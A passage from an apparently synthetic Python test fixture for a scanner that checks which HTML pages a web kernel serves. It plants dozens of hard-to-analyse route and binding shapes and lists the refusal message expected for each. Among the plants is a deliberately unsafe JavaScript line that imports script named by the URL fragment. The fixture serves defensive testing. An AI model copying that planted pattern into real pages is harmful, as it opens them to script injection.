            ("G9 a chain two calls deep on a module dict", "g9"), ("G15 same-named locals in two functions", "g15"))
FGH_REFUSED = (("G7 a receiver a function returns", "g7",
                "SERVED kernel/kernel.py:%d builds a served page from _probe_g7().get('x', '<p>none</p>') (a function's return), text the census did not read"),
               ("G8 a container the module writes at run time", "g8",
                "SERVED kernel/kernel.py:%d builds a served page from _PROBE_G8_MEMO['k'], a container the module writes at run time"),
               ("G10 a chain two deep through a function's return", "g10",
                "SERVED kernel/kernel.py:%d builds a served page from _probe_g10().get('x', '') (a function's return), text the census did not read"),
               ("G11 a receiver a method returns", "g11",
                "SERVED kernel/kernel.py:%d builds a served page from self._probe_g11().get('x', '') (a method's return), text the census did not read"))
FGH_PLANT_LINES = (tuple((tag, _fgh_mark(tag)) for tag in [t for _, t in FGH_TYPED + FGH_READ] + ["f12", "h2", "h5"])
                   + (("f7", 'self.send_header("Content-Type", "text/html")'), ("f9", 'open("/nonexistent")'), ("f10", "_probe_f10_type())"),
                      ("g7", "_probe_g7().get("), ("g8", '_PROBE_G8_MEMO["k"], "text/html"'), ("g10", "_probe_g10().get("),
                      ("g11", "self._probe_g11().get("), ("h4", "import(location.hash.slice(1))"), ("drift_js", "_RDRIFT_JS = ("),
                      ("h5_open", 'f"""<html>'), ("slice", SLICE_LITERAL), (("h6_first", "h6_second"), _fgh_mark("h6")),
                      ("h7", _fgh_mark("h7")), ("r1", _fgh_mark("r1")), ("r1_open", 'self._send(200, f"""<p>{p'), ("r2", _fgh_mark("r2")),
                      ("r2_value", ' f"<b>{p}"'), ("r3", _fgh_mark("r3")), ("r3_open", 'self._send(200, (f"<p>{p}</p>"')))
SERVED_COMPUTED_PLANTS = ("slot", "h4")   # the plants whose one site is the computed class: the format slot and H4's second import(

# B and C of the sixth round (2026-09-24), the served routes' and the served text's refusals, planted in the same pass: do_GET
# branches before the /chat branch (BC_ROUTES) with what they read appended at the module's end (BC_DEFS). Each plant is silent at
# the sixth round's head but five (c3s and c3d, read there at call.args[1], and rbi and rbd, read there as the text their names
# hold, each page's fetch UNCLASSIFIED, and c3k, whose keyword body crashes the run with an IndexError and no line) and a SERVED
# line by name here, each line held at the plant's own line (BC_PLANT_LINES, by content), save grl, held at no line. B: a route
# typed through a module name the module writes after binding it (a subscript store, a rebind under `global`, a dunder mutator, a
# container type's method naming it first, and an import, a def, a class statement or an except clause binding it under `global`); a
# body the census does not read at the call's second positional argument (a keyword body, a starred argument before the body, a `**`
# spread; the definition that writes its third parameter, c3p, is a probe module of its own since the seventh round, below, since a
# second `_send` in kernel/kernel.py would refuse every route of that file, and the class with two `_send` definitions, tsd, went with
# it and is refused there as a `_send` bound more than once); a reference to `_send` that is no call (an alias of the bound method, a
# bare read, a getattr naming it, a string equal to `_send`). C: a bare module name bound other than by one assignment (only
# inside a try, a default and then a rebind, an import or a def and then an assignment, a builtin-named name bound in a try) or rebound (an import, a def or a builtin a function binds under
# `global`, an import a statement at module level writes), and the same rule over a route's type (a type constant bound again under
# an if); a call to a callee the pass does not follow (a module-constant lambda, a constant aliasing a function, functools.partial
# through a constant, an instance read through a constant, a subscript dispatch, a callee that is itself a call, a class, a
# local-bound callee, a rebound import or def, a builtin-named constant); a container a container type's method writes, read in a
# page; and an import a function writes only through a local of its own (grl), which keeps its exemption.
BC_ROUTES = "".join((
    _fgh_route("c1s", 'return self._send(200, "%s", _PROBE_C1S["page"])' % (FGH_PAGE % "c1s")),
    _fgh_route("c1g", 'return self._send(200, "%s", _PROBE_C1G)' % (FGH_PAGE % "c1g")),
    _fgh_route("c2ct", 'return self._send(200, "%s", _PROBE_C2CT)' % (FGH_PAGE % "c2ct")),
    _fgh_route("c3k", 'return self._send(200, body="%s", ctype="text/html")' % (FGH_PAGE % "c3k")),
    _fgh_route("c3s", 'return self._send(*(200,), "%s", ctype="text/html")' % (FGH_PAGE % "c3s")),
    _fgh_route("c3d", 'return self._send(200, "%s", "text/html", **{})' % (FGH_PAGE % "c3d")),
    _fgh_route("c5a", "reply = self._send", 'return reply(200, "%s", "text/html")' % (FGH_PAGE % "c5a")),
    _fgh_route("c5n", "_c5n = _send", 'return self._send(200, "<p>c5n</p>", "text/plain")'),
    _fgh_route("c5g", 'return getattr(self, "_send")(200, "%s", "text/html")' % (FGH_PAGE % "c5g")),
    _fgh_route("c2t", 'return self._send(200, "<p>c2t</p>" + _PROBE_C2T, "text/html")'),
    _fgh_route("c2d", 'return self._send(200, "<p>c2d</p>" + _PROBE_C2D, "text/html")'),
    _fgh_route("c1a", 'return self._send(200, "<p>c1a</p>" + _PROBE_C1A, "text/html")'),
    _fgh_route("c1u", 'return self._send(200, "<p>c1u</p>" + _PROBE_C1U, "text/html")'),
    _fgh_route("c1c", 'return self._send(200, "<p>c1c</p>" + _PROBE_C1C, "text/html")'),
    _fgh_route("x6l", 'return self._send(200, "<p>x6l</p>" + _PROBE_X6L("t"), "text/html")'),
    _fgh_route("x6a", 'return self._send(200, "<p>x6a</p>" + _PROBE_X6A("t"), "text/html")'),
    _fgh_route("x6p", 'return self._send(200, "<p>x6p</p>" + _PROBE_X6P(), "text/html")'),
    _fgh_route("x6i", 'return self._send(200, "<p>x6i</p>" + _PROBE_X6I.page(), "text/html")'),
    _fgh_route("x6s", 'return self._send(200, "<p>x6s</p>" + _PROBE_X6S["k"]("t"), "text/html")'),
    _fgh_route("x6c", 'return self._send(200, "<p>x6c</p>" + _probe_x6c_factory()("t"), "text/html")'),
    _fgh_route("x6k", 'return self._send(200, "<p>x6k</p>" + _ProbeX6K("t"), "text/html")'),
    _fgh_route("x6o", "_pg = _probe_x6o_page", 'return self._send(200, "<p>x6o</p>" + _pg("t"), "text/html")'),
    _fgh_route("wsi", 'return self._send(200, "%s", _PROBE_WSI["page"])' % (FGH_PAGE % "wsi")),
    _fgh_route("wdu", 'return self._send(200, "%s", _PROBE_WDU["page"])' % (FGH_PAGE % "wdu")),
    _fgh_route("wco", 'return self._send(200, "%s", _PROBE_WCO["page"])' % (FGH_PAGE % "wco")),
    _fgh_route("wla", 'return self._send(200, "<p>wla</p>" + _PROBE_WLA[0], "text/html")'),
    _fgh_route("wsa", 'return self._send(200, "<p>wsa</p>" + "".join(_PROBE_WSA), "text/html")'),
    _fgh_route("srb", 'return builtins.getattr(self, "_send")(200, "%s", "text/html")' % (FGH_PAGE % "srb")),
    _fgh_route("sra", 'return operator.attrgetter("_send")(self)(200, "%s", "text/html")' % (FGH_PAGE % "sra")),
    _fgh_route("srg", 'return self.__getattribute__("_send")(200, "%s", "text/html")' % (FGH_PAGE % "srg")),
    _fgh_route("srv", 'return vars(type(self))["_send"](self, 200, "%s", "text/html")' % (FGH_PAGE % "srv")),
    _fgh_route("rbi", 'return self._send(200, "<p>rbi</p>" + _PROBE_RBI, "text/html")'),
    _fgh_route("rbk", 'return self._send(200, "<p>rbk</p>" + _PROBE_RBK("t"), "text/html")'),
    _fgh_route("rbd", 'return self._send(200, "<p>rbd</p>" + _probe_rbd, "text/html")'),
    _fgh_route("rbc", 'return self._send(200, "<p>rbc</p>" + _probe_rbc(), "text/html")'),
    _fgh_route("bic", 'return self._send(200, "<p>bic</p>" + format("t"), "text/html")'),
    _fgh_route("bit", 'return self._send(200, "<p>bit</p>" + ascii, "text/html")'),
    _fgh_route("gti", 'return self._send(200, "%s", _PROBE_GTI)' % (FGH_PAGE % "gti")),
    _fgh_route("gtf", 'return self._send(200, "%s", _PROBE_GTF)' % (FGH_PAGE % "gtf")),
    _fgh_route("gtd", 'return self._send(200, "%s", _PROBE_GTD)' % (FGH_PAGE % "gtd")),
    _fgh_route("gtc", 'return self._send(200, "%s", _PROBE_GTC)' % (FGH_PAGE % "gtc")),
    _fgh_route("gte", 'return self._send(200, "%s", _PROBE_GTE)' % (FGH_PAGE % "gte")),
    _fgh_route("gri", 'return self._send(200, "<p>gri</p>" + _PROBE_GRI, "text/html")'),
    _fgh_route("grd", 'return self._send(200, "<p>grd</p>" + _probe_grd(), "text/html")'),
    _fgh_route("grb", 'return self._send(200, "<p>grb</p>" + hex, "text/html")'),
    _fgh_route("grm", 'return self._send(200, "<p>grm</p>" + _PROBE_GRM, "text/html")'),
    _fgh_route("grl", 'return self._send(200, "<p>grl</p>" + _PROBE_GRL, "text/html")')))
BC_DEFS = "\n\n" + "\n\n\n".join((
    '_PROBE_C1S = {"page": "application/json"}\n_PROBE_C1S["page"] = "text/html"',
    '_PROBE_C1G = "application/json"\n\n\ndef _probe_c1g_set():\n    global _PROBE_C1G\n    _PROBE_C1G = "text/html"',
    '_PROBE_C2CT = "text/plain"\nif _PROBE_C2CT == "text/plain":\n    _PROBE_C2CT = "text/html"',
    'try:\n    _PROBE_C2T = "%s"\nexcept Exception:\n    pass' % (FGH_PAGE % "c2t"),
    '_PROBE_C2D = "<p>none</p>"\ntry:\n    _PROBE_C2D = "%s"\nexcept Exception:\n    pass' % (FGH_PAGE % "c2d"),
    '_PROBE_C1A: str = "%s"' % (FGH_PAGE % "c1a"),
    '_PROBE_C1U, _PROBE_C1V = "%s", "<p>none</p>"' % (FGH_PAGE % "c1u"),
    '_PROBE_C1C = _PROBE_C1D = "%s"' % (FGH_PAGE % "c1c"),
    '_PROBE_X6L = lambda t: "%s" + t' % (FGH_PAGE % "x6l"),
    'def _probe_x6a_page(t):\n    return "%s" + t\n\n\n_PROBE_X6A = _probe_x6a_page' % (FGH_PAGE % "x6a"),
    'def _probe_x6p_page(t):\n    return "%s" + t\n\n\n_PROBE_X6P = functools.partial(_probe_x6p_page, "t")' % (FGH_PAGE % "x6p"),
    'class _ProbeX6Page(object):\n    def page(self):\n        return "%s"\n\n\n_PROBE_X6I = _ProbeX6Page()' % (FGH_PAGE % "x6i"),
    'def _probe_x6s_page(t):\n    return "%s" + t\n\n\n_PROBE_X6S = {"k": _probe_x6s_page}' % (FGH_PAGE % "x6s"),
    'def _probe_x6c_page(t):\n    return "%s" + t\n\n\ndef _probe_x6c_factory():\n    return _probe_x6c_page' % (FGH_PAGE % "x6c"),
    'class _ProbeX6K(str):\n    def __new__(cls, t):\n        return str.__new__(cls, "%s" + t)' % (FGH_PAGE % "x6k"),
    'def _probe_x6o_page(t):\n    return "%s" + t' % (FGH_PAGE % "x6o"),
    '_PROBE_WSI = {"page": "application/json"}\n\n\ndef _probe_wsi_set():\n    _PROBE_WSI.__setitem__("page", "text/html")',
    '_PROBE_WDU = {"page": "application/json"}\ndict.update(_PROBE_WDU, page="text/html")',
    '_PROBE_WCO = {"page": "application/json"}\ncollections.OrderedDict.update(_PROBE_WCO, page="text/html")',
    '_PROBE_WLA = ["<p>none</p>"]\nlist.append(_PROBE_WLA, "%s")' % (FGH_PAGE % "wla"),
    '_PROBE_WSA = {"<p>none</p>"}\nset.add(_PROBE_WSA, "%s")' % (FGH_PAGE % "wsa"),
    'from json import dumps as _PROBE_RBI\n_PROBE_RBI = "%s"' % (FGH_PAGE % "rbi"),
    'from json import dumps as _PROBE_RBK\n_PROBE_RBK = lambda t: "%s" + t' % (FGH_PAGE % "rbk"),
    'def _probe_rbd():\n    return "<p>none</p>"\n\n\n_probe_rbd = "%s"' % (FGH_PAGE % "rbd"),
    'def _probe_rbc():\n    return "<p>none</p>"\n\n\n_probe_rbc = lambda: "%s"' % (FGH_PAGE % "rbc"),
    'format = lambda t: "%s" + t' % (FGH_PAGE % "bic"),
    'try:\n    ascii = "%s"\nexcept Exception:\n    pass' % (FGH_PAGE % "bit"),
    '_PROBE_GTI = "application/json"\n\n\ndef _probe_gti_set():\n    global _PROBE_GTI\n    import json as _PROBE_GTI',
    '_PROBE_GTF = "application/json"\n\n\ndef _probe_gtf_set():\n    global _PROBE_GTF\n    from json import dumps as _PROBE_GTF',
    '_PROBE_GTD = "application/json"\n\n\ndef _probe_gtd_set():\n    global _PROBE_GTD\n\n    def _PROBE_GTD():\n        return "text/html"',
    '_PROBE_GTC = "application/json"\n\n\ndef _probe_gtc_set():\n    global _PROBE_GTC\n\n    class _PROBE_GTC(object):\n        pass',
    '_PROBE_GTE = "application/json"\n\n\ndef _probe_gte_set():\n    global _PROBE_GTE\n    try:\n        pass\n'
    '    except Exception as _PROBE_GTE:\n        pass',
    'from json import dumps as _PROBE_GRI\n\n\ndef _probe_gri_set():\n    global _PROBE_GRI\n    _PROBE_GRI = "%s"' % (FGH_PAGE % "gri"),
    'def _probe_grd():\n    return "<p>none</p>"\n\n\ndef _probe_grd_set():\n    global _probe_grd\n    _probe_grd = lambda: "%s"' % (FGH_PAGE % "grd"),
    'def _probe_grb_set():\n    global hex\n    hex = "%s"' % (FGH_PAGE % "grb"),
    'from json import dumps as _PROBE_GRM\n_PROBE_GRM["page"] = "%s"' % (FGH_PAGE % "grm"),
    'from json import dumps as _PROBE_GRL\n\n\ndef _probe_grl_local():\n    _PROBE_GRL = []\n    _PROBE_GRL.append("%s")\n'
    '    return _PROBE_GRL' % (FGH_PAGE % "grl"))) + "\n"
_TYPE_UNREAD = "SERVED kernel/kernel.py:%%d serves a response whose content type the census cannot resolve (%s in Handler.do_GET)"
_BODY_UNREAD = ("SERVED kernel/kernel.py:%%d serves text/html through %s, whose page body the census does not read (%s, in %s): the census "
                "reads a body as the call's second positional argument, the parameter the definition writes; pass it so")
_SEND_REF = ("SERVED kernel/kernel.py:%%d refers to _send other than by a call the scan reads (%s in Handler.do_GET): the routes are the "
             "calls spelled _send(...) or <x>._send(...); call it so, or name the place in SERVED_ALLOW with its reason")
_TEXT_UNREAD = "SERVED kernel/kernel.py:%%d builds a served page from %s (%s), text the census did not read"
_MEMO_UNREAD = ("SERVED kernel/kernel.py:%%d builds a served page from %s, a container the module writes at run time: name it in SERVED_ALLOW "
                "with the walked file its value comes from")
_REBOUND = "a module name bound other than by one assignment"
_NOT_SECOND = "the definition's written body is not its second positional parameter"
# (the plant, its tag, the SERVED line with the tag's line in place of %d); B's, then C's
BC_ROUTE_REFUSED = (("B1 a dict constant a subscript store rewrites types a route", "c1s", _TYPE_UNREAD % "_PROBE_C1S['page']"),
                    ("B1 a constant rebound under global types a route", "c1g", _TYPE_UNREAD % "_PROBE_C1G"),
                    ("B2 a body passed by keyword", "c3k", _BODY_UNREAD % ("Handler._send", "a keyword body", "Handler.do_GET")),
                    ("B2 a starred argument before the body", "c3s", _BODY_UNREAD % ("Handler._send", "a starred argument", "Handler.do_GET")),
                    ("B2 a ** spread", "c3d", _BODY_UNREAD % ("Handler._send", "a ** argument", "Handler.do_GET")),
                    ("B3 an alias of the bound method", "c5a", _SEND_REF % "self._send"),
                    ("B3 a bare _send read", "c5n", _SEND_REF % "_send"),
                    ("B3 a getattr naming _send", "c5g", _SEND_REF % "getattr(self, '_send')"),
                    ("B1 a dict constant a __setitem__ call rewrites types a route", "wsi", _TYPE_UNREAD % "_PROBE_WSI['page']"),
                    ("B1 a dict constant dict.update(<name>, ...) rewrites types a route", "wdu", _TYPE_UNREAD % "_PROBE_WDU['page']"),
                    ("B1 a dict constant a collections type's update rewrites types a route", "wco", _TYPE_UNREAD % "_PROBE_WCO['page']"),
                    ("B3 a string equal to _send through builtins.getattr", "srb", _SEND_REF % "'_send'"),
                    ("B3 a string equal to _send through operator.attrgetter", "sra", _SEND_REF % "'_send'"),
                    ("B3 a string equal to _send through __getattribute__", "srg", _SEND_REF % "'_send'"),
                    ("B3 a string equal to _send as a key of vars()", "srv", _SEND_REF % "'_send'"),
                    ("B1 a type constant an import under global rebinds types a route", "gti", _TYPE_UNREAD % "_PROBE_GTI"),
                    ("B1 a type constant a from-import under global rebinds types a route", "gtf", _TYPE_UNREAD % "_PROBE_GTF"),
                    ("B1 a type constant a def under global rebinds types a route", "gtd", _TYPE_UNREAD % "_PROBE_GTD"),
                    ("B1 a type constant a class statement under global rebinds types a route", "gtc", _TYPE_UNREAD % "_PROBE_GTC"),
                    ("B1 a type constant an except clause under global rebinds types a route", "gte", _TYPE_UNREAD % "_PROBE_GTE"))
_IN_BLOCK_BODY = "a module name bound once inside a module-level block, not by a top-level statement"   # since the seventh round's review
# since the seventh round's review too: a name one top-level annotated, unpacking or chained assignment binds is no constant, and says so
_ASSIGN_FORM = "a module name bound by an annotated, unpacking or chained assignment, which the census does not read as a constant"
BC_TEXT_REFUSED = (("C1 a module name bound only inside a try", "c2t", _TEXT_UNREAD % ("_PROBE_C2T", _IN_BLOCK_BODY)),
                   ("C1 a default and then a rebind", "c2d", _TEXT_UNREAD % ("_PROBE_C2D", "a module name bound other than by one assignment")),
                   ("C1 a module name one annotated assignment binds", "c1a", _TEXT_UNREAD % ("_PROBE_C1A", _ASSIGN_FORM)),
                   ("C1 a module name one unpacking assignment binds", "c1u", _TEXT_UNREAD % ("_PROBE_C1U", _ASSIGN_FORM)),
                   ("C1 a module name one chained assignment binds", "c1c", _TEXT_UNREAD % ("_PROBE_C1C", _ASSIGN_FORM)),
                   ("C1 a type constant bound again under an if", "c2ct", _TYPE_UNREAD % "_PROBE_C2CT"),
                   ("C2 a module-constant lambda", "x6l", _TEXT_UNREAD % ("_PROBE_X6L('t')", "a call")),
                   ("C2 a module constant aliasing a function", "x6a", _TEXT_UNREAD % ("_PROBE_X6A('t')", "a call")),
                   ("C2 functools.partial through a module constant", "x6p", _TEXT_UNREAD % ("_PROBE_X6P()", "a call")),
                   ("C2 an instance read through a module constant", "x6i", _TEXT_UNREAD % ("_ProbeX6Page()", "a call")),
                   ("C2 a subscript dispatch", "x6s", _TEXT_UNREAD % ("_PROBE_X6S['k']('t')", "a call")),
                   ("C2 a callee that is itself a call", "x6c", _TEXT_UNREAD % ("_probe_x6c_factory()('t')", "a call")),
                   ("C2 a class callee", "x6k", _TEXT_UNREAD % ("_ProbeX6K('t')", "a call")),
                   ("C2 a local-bound callee", "x6o", _TEXT_UNREAD % ("_pg('t')", "a call")),
                   ("B1 a list constant list.append(<name>, ...) writes, read in a page", "wla", _MEMO_UNREAD % "_PROBE_WLA[0]"),
                   ("B1 a set constant set.add(<name>, ...) writes, read in a page", "wsa", _MEMO_UNREAD % "_PROBE_WSA"),
                   ("C1 an import rebound by an assignment", "rbi", _TEXT_UNREAD % ("_PROBE_RBI", _REBOUND)),
                   ("C1 an import rebound by an assignment, called", "rbk", _TEXT_UNREAD % ("_PROBE_RBK('t')", "a call")),
                   ("C1 a def rebound by an assignment", "rbd", _TEXT_UNREAD % ("_probe_rbd", _REBOUND)),
                   ("C1 a def rebound by an assignment, called", "rbc", _TEXT_UNREAD % ("_probe_rbc()", "a call")),
                   ("C1 a builtin-named module constant, called", "bic", _TEXT_UNREAD % ("format('t')", "a call")),
                   ("C1 a builtin-named name bound inside a try", "bit", _TEXT_UNREAD % ("ascii", _IN_BLOCK_BODY)),
                   ("C1 an import a function rebinds under global", "gri", _TEXT_UNREAD % ("_PROBE_GRI", _REBOUND)),
                   ("C1 a def a function rebinds under global, called", "grd", _TEXT_UNREAD % ("_probe_grd()", "a call")),
                   ("C1 a builtin a function rebinds under global", "grb", _TEXT_UNREAD % ("hex", _REBOUND)),
                   ("C1 an import a module-level statement writes", "grm", _TEXT_UNREAD % ("_PROBE_GRM", _REBOUND)))
BC_PLANT_LINES = (("c1s", '_PROBE_C1S["page"])'), ("c1g", "_PROBE_C1G)"), ("c2ct", "_PROBE_C2CT)"),
                  ("c3k", _fgh_mark("c3k")), ("c3s", _fgh_mark("c3s")), ("c3d", _fgh_mark("c3d")), ("c5a", "reply = self._send"),
                  ("c5n", "_c5n = _send"), ("c5g", 'return getattr(self, "_send")'), ("c2t", "+ _PROBE_C2T,"), ("c2d", "+ _PROBE_C2D,"),
                  ("c1a", "+ _PROBE_C1A,"), ("c1u", "+ _PROBE_C1U,"), ("c1c", "+ _PROBE_C1C,"),
                  ("x6l", '_PROBE_X6L("t")'), ("x6a", '_PROBE_X6A("t")'), ("x6p", "_PROBE_X6P()"), ("x6i", "_PROBE_X6I = _ProbeX6Page()"),
                  ("x6s", '_PROBE_X6S["k"]("t")'), ("x6c", '_probe_x6c_factory()("t")'), ("x6k", '_ProbeX6K("t")'), ("x6o", '_pg("t")'),
                  ("wsi", '_PROBE_WSI["page"])'), ("wdu", '_PROBE_WDU["page"])'), ("wco", '_PROBE_WCO["page"])'), ("wla", "+ _PROBE_WLA[0],"),
                  ("wsa", '"".join(_PROBE_WSA)'), ("srb", 'builtins.getattr(self, "_send")'), ("sra", 'operator.attrgetter("_send")'),
                  ("srg", 'self.__getattribute__("_send")'), ("srv", 'vars(type(self))["_send"]'), ("rbi", "+ _PROBE_RBI,"), ("rbk", '+ _PROBE_RBK("t"),'), ("rbd", "+ _probe_rbd,"),
                  ("rbc", "+ _probe_rbc(),"), ("bic", '+ format("t"),'), ("bit", "+ ascii,"),
                  ("gti", "_PROBE_GTI)"), ("gtf", "_PROBE_GTF)"), ("gtd", "_PROBE_GTD)"), ("gtc", "_PROBE_GTC)"), ("gte", "_PROBE_GTE)"),
                  ("gri", "+ _PROBE_GRI,"), ("grd", "+ _probe_grd(),"), ("grb", '"<p>grb</p>" + hex,'), ("grm", "+ _PROBE_GRM,"))

# A of the seventh round (2026-09-25), the Python readers failing closed, planted in the same pass. The shapes a reader does not
# read each refuse by name with the reason the ruling's table gives; the two limits each hold a witness at its outcome. In
# kernel/kernel.py's text: do_GET branches before the /chat branch (A_ROUTES) with what they read appended at the module's end
# (A_DEFS): (a) a walrus in each part of a module-level def's or class's header, and in a def inside a module-level if, beside the
# name's one assignment, as a page's name and as a route's type; (c) a walrus in a nested def's, class's or lambda's header inside a
# page function (read as a local with its value) and inside do_GET (a route's type unresolved); (d) a callee, a bare name and a
# receiver the page function's scope binds in a form the reader does not read as the module's (a local, a loop, with or
# comprehension target, a parameter and an except name sharing a module function's name, a function-level import, a nested class,
# a nested def beside an assignment, a del, a global, a nonlocal), and a parameter callee sharing no module function's name, which
# stays a value slot; (e) an import, a def and a class bound once inside a module-level block, in each role; and the cross-file
# override's witness route. In walked Python files of their own (A_FILES, each a synthetic module under kernel/, since a
# file-wide refusal (g) or a star import (b) decides every route in its file): (b) a star import's four roles and a bare `_send`
# call under it; (f) a decorated `_send` at both reaches; (g) a `_send` bound more than once or other than by one def statement;
# (h) a `_send` definition that writes anything besides its page parameter, each road; the sixth round's c3p and tsd plants, moved
# here from kernel/kernel.py (a second `_send` there would refuse every route of that file); the limits' witnesses; and, since the
# seventh round's review, (r) a bare `_send` call a scope around it binds and a call that reaches no definition the census reads, each
# with a reason true for it, and the receiver bases that are calls (cb). The walrus in an annotation (hda, hdv, hdw, hdr) parses on
# every interpreter and does not compile on 3.14, where a walrus in an annotation is a syntax error at compile time; the census only
# parses, so those plants read the same on every cell.
A_PAGE_NONE = "<p>none</p>"   # the value a probe name's one assignment binds, beside the binding the reader must not miss


def _a_text(tag, expr):
    """A do_GET branch serving `"<p><tag></p>" + <expr>` as text/html: expr is the page text a reader must read or refuse."""
    return _fgh_route(tag, 'return self._send(200, "<p>%s</p>" + %s, "text/html")' % (tag, expr))


def _a_walrus(tag):
    """The page text a header walrus binds (a fetch tagged `<tag>w`, never read at either head): the binding the reader must see."""
    return FGH_PAGE % (tag + "w")


A_HEADER = (("hdd", '@_probe_h_deco(_PROBE_HDD := "%s")\ndef _probe_hdd():\n    return None'),
            ("hdp", 'def _probe_hdp(page=(_PROBE_HDP := "%s")):\n    return page'),
            ("hdk", 'def _probe_hdk(*, page=(_PROBE_HDK := "%s")):\n    return page'),
            ("hda", 'def _probe_hda(page: (_PROBE_HDA := "%s")):\n    return page'),
            ("hdv", 'def _probe_hdv(*pages: (_PROBE_HDV := "%s")):\n    return pages'),
            ("hdw", 'def _probe_hdw(**pages: (_PROBE_HDW := "%s")):\n    return pages'),
            ("hdr", 'def _probe_hdr() -> (_PROBE_HDR := "%s"):\n    return None'),
            ("hcd", '@_probe_h_deco(_PROBE_HCD := "%s")\nclass _ProbeHcd(object):\n    pass'),
            ("hcb", 'class _ProbeHcb((_PROBE_HCB := "%s").__class__):\n    pass'),
            ("hck", 'class _ProbeHck(object, page=(_PROBE_HCK := "%s")):\n    pass'),
            ("hif", 'if True:\n    def _probe_hif(page=(_PROBE_HIF := "%s")):\n        return page'))
A_HEADER_PARTS = {"hdd": "a def's decorator", "hdp": "a positional default", "hdk": "a keyword-only default", "hda": "an argument's annotation",
                  "hdv": "the *args annotation", "hdw": "the **kwargs annotation", "hdr": "the return annotation", "hcd": "a class's decorator",
                  "hcb": "a class's base", "hck": "a class's keyword", "hif": "a def inside a module-level if (its default)"}
A_CALLEES = ("dl", "dt", "dw", "dp", "de", "di", "dc", "dx", "dq")   # the (d) callees sharing a module function's name: each has one, its page tagged
A_ROUTES = "".join(tuple(_a_text(tag, "_PROBE_%s" % tag.upper()) for tag, _ in A_HEADER) + (
    _fgh_route("hct", 'return self._send(200, "%s", _PROBE_HCT)' % (FGH_PAGE % "hct")),
    _a_text("cnd", "_probe_cnd_page()"), _a_text("cnc", "_probe_cnc_page()"), _a_text("cnl", "_probe_cnl_page()"),
    _fgh_route("ctd", 'def _pctd(t=(_PROBE_CTD := "text/html")):', "    return t", 'return self._send(200, "%s", _PROBE_CTD)' % (FGH_PAGE % "ctd")),
    _fgh_route("ctc", 'class _Pctc((_PROBE_CTC := "text/html").__class__):', "    pass", 'return self._send(200, "%s", _PROBE_CTC)' % (FGH_PAGE % "ctc")),
    _fgh_route("ctl", '_pctl = lambda t=(_PROBE_CTL := "text/html"): t', 'return self._send(200, "%s", _PROBE_CTL)' % (FGH_PAGE % "ctl"))) + tuple(
    _a_text(tag, "_probe_%s_page(%s)" % (tag, "str" if tag in ("dp", "dpn", "dm") else ""))
    for tag in A_CALLEES + ("dr", "db", "dv", "dg", "dd", "dn", "dm", "dk", "ds", "dpn")) + (
    _a_text("er", '_PROBE_ER.dumps("x")'), _a_text("ec", '_probe_ec("x")'), _a_text("eb", "_PROBE_EB"), _a_text("ed", "_probe_ed()"),
    _fgh_route("lox", 'return self._send(200, "%s", "text/html")' % (FGH_PAGE % "lox"))))


def _a_make(tag):
    """The module function a (d) callee shares its name with: its page tagged `<tag>`, scanned only if the reader wrongly follows it."""
    return 'def _probe_%s_make(t):\n    return "%s" + t' % (tag, FGH_PAGE % tag)


A_DEFS = "\n\n" + "\n\n\n".join(("def _probe_h_deco(page):\n    return lambda f: f",) + tuple(
    '_PROBE_%s = "%s"\n\n\n%s' % (tag.upper(), A_PAGE_NONE, text % _a_walrus(tag)) for tag, text in A_HEADER) + (
    '_PROBE_HCT = "application/json"\n\n\nclass _ProbeHct(object, ctype=(_PROBE_HCT := "text/html")):\n    pass',
    '_PROBE_CND = "%s"\n\n\ndef _probe_cnd_page():\n    def _pick(page=(_PROBE_CND := "%s")):\n        return page\n    return _PROBE_CND' % (A_PAGE_NONE, FGH_PAGE % "cnd"),
    '_PROBE_CNC = "%s"\n\n\ndef _probe_cnc_page():\n    class _Pick((_PROBE_CNC := "%s").__class__):\n        pass\n    return _PROBE_CNC' % (A_PAGE_NONE, FGH_PAGE % "cnc"),
    '_PROBE_CNL = "%s"\n\n\ndef _probe_cnl_page():\n    _pick = lambda page=(_PROBE_CNL := "%s"): page\n    return _PROBE_CNL' % (A_PAGE_NONE, FGH_PAGE % "cnl"),
    '_PROBE_CTD = "application/json"\n_PROBE_CTC = "application/json"\n_PROBE_CTL = "application/json"',
    _a_make("dl") + '\n\n\ndef _probe_dl_page():\n    _probe_dl_make = str\n    return _probe_dl_make("t")',
    _a_make("dt") + '\n\n\ndef _probe_dt_page():\n    for _probe_dt_make in (str,):\n        return _probe_dt_make("t")\n    return ""',
    _a_make("dw") + '\n\n\ndef _probe_dw_page():\n    with open(__file__) as _probe_dw_make:\n        return _probe_dw_make("t")',
    _a_make("dp") + '\n\n\ndef _probe_dp_page(_probe_dp_make):\n    return _probe_dp_make("t")',
    _a_make("de") + '\n\n\ndef _probe_de_page():\n    try:\n        return ""\n    except Exception as _probe_de_make:\n        return _probe_de_make("t")',
    _a_make("di") + '\n\n\ndef _probe_di_page():\n    from json import dumps as _probe_di_make\n    return _probe_di_make("t")',
    _a_make("dc") + '\n\n\ndef _probe_dc_page():\n    class _probe_dc_make(str):\n        pass\n    return _probe_dc_make("t")',
    _a_make("dx") + '\n\n\ndef _probe_dx_page():\n    _probe_dx_make = str\n    return _probe_dx_make("t").replace("a", "b")',
    _a_make("dq") + '\n\n\ndef _probe_dq_page():\n    return "".join([_probe_dq_make("t") for _probe_dq_make in (str,)])',
    'def _probe_dr_page():\n    def _probe_dr_make(t):\n        return t\n    _probe_dr_make = lambda t: "%s" + t\n    return _probe_dr_make("t")' % (FGH_PAGE % "dr"),
    '_PROBE_DB = "%s"\n\n\ndef _probe_db_page():\n    import json as _PROBE_DB\n    return _PROBE_DB' % (FGH_PAGE % "db"),
    '_PROBE_DV = {"k": "%s"}\n\n\ndef _probe_dv_page():\n    import json as _PROBE_DV\n    return _PROBE_DV.get("k", "")' % (FGH_PAGE % "dv"),
    '_PROBE_DG = "%s"\n\n\ndef _probe_dg_page():\n    global _PROBE_DG\n    _PROBE_DG = "%s"\n    return _PROBE_DG' % (FGH_PAGE % "dg", A_PAGE_NONE),
    '_PROBE_DD = "%s"\n\n\ndef _probe_dd_page():\n    return _PROBE_DD\n    del _PROBE_DD' % (FGH_PAGE % "dd"),
    'def _probe_dn_page():\n    _probe_dn_text = "%s"\n\n    def _probe_dn_set():\n        nonlocal _probe_dn_text\n        _probe_dn_text = "%s"\n'
    '    _probe_dn_set()\n    return _probe_dn_text' % (A_PAGE_NONE, FGH_PAGE % "dn"),
    '_PROBE_DM = "%s"\n\n\ndef _probe_dm_page(v):\n    match v:\n        case _PROBE_DM:\n            pass\n    return _PROBE_DM' % (FGH_PAGE % "dm"),
